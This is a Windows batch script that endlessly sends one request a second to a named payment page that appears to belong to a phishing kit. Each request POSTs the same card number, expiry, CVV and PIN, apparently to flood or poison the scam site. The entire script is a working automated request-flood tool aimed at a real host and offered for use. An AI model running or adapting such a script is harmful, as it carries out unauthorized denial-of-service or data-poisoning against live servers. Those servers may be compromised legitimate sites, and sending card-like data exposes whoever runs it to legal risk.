@echo off
title Fuck phishing website
SETLOCAL EnableDelayedExpansion
for /F "tokens=1,2 delims=#" %%a in ('"prompt #$H#$E# & echo on & for %%b in (1) do rem"') do (
  set "DEL=%%a"
)

set packet=1
:loop
call :ColorText 08 "Sending request #%packet% ... "
echo.
curl -s "https://drharishthakkar.com/Corrreoss/08015/pay.php" -H "authority: drharishthakkar.com" -H "accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9" -H "accept-language: es,en-GB;q=0.9,en-US;q=0.8,en;q=0.7" -H "cache-control: no-cache" -H "content-type: application/x-www-form-urlencoded" -H "cookie: PHPSESSID=6bkbcfq9uv52njenu49cdtv6j5" -H "origin: https://drharishthakkar.com" -H "pragma: no-cache" -H "referer: https://drharishthakkar.com/Corrreoss/08015/Redsys.html" -H "sec-fetch-dest: document" -H "sec-fetch-mode: navigate" -H "sec-fetch-site: same-origin" -H "sec-fetch-user: ?1" -H "sec-gpc: 1" -H "upgrade-insecure-requests: 1" -H "user-agent: craciu25yt is ur friend" --data-raw "Sis_Numero_Tarjeta=4565660976802637&Sis_Caducidad_Tarjeta_Mes=11&Sis_Caducidad_Tarjeta_Anno=23&Sis_Tarjeta_CVV2=424&Sis_Tarjeta_PIN=2532&Sis_Divisa=&browserJavaEnabled=false&browserLanguage=en-US&browserColorDepth=24&browserScreenHeight=657&browserScreenWidth=1366&browserTZ=0&browserUserAgent=Mozilla^%^2F5.0+^%^28Windows+NT+6.3^%^3B+Win64^%^3B+x64^%^29+AppleWebKit^%^2F537.36+^%^28KHTML^%^2C+like+Gecko^%^29+Chrome^%^2F77.0.3865.90+Safari^%^2F537.36&threeDSCompInd=U&bcancel="
call :ColorText 0a "Request #%packet% sended. "
echo.
echo.
set /a packet=%packet%+1 >nul
timeout 1 /nobreak >nul

goto loop

goto :eof
:ColorText
echo off
<nul set /p ".=%DEL%" > "%~2"
findstr /v /a:%1 /R "^$" "%~2" nul
del "%~2" > nul 2>&1
goto :eof
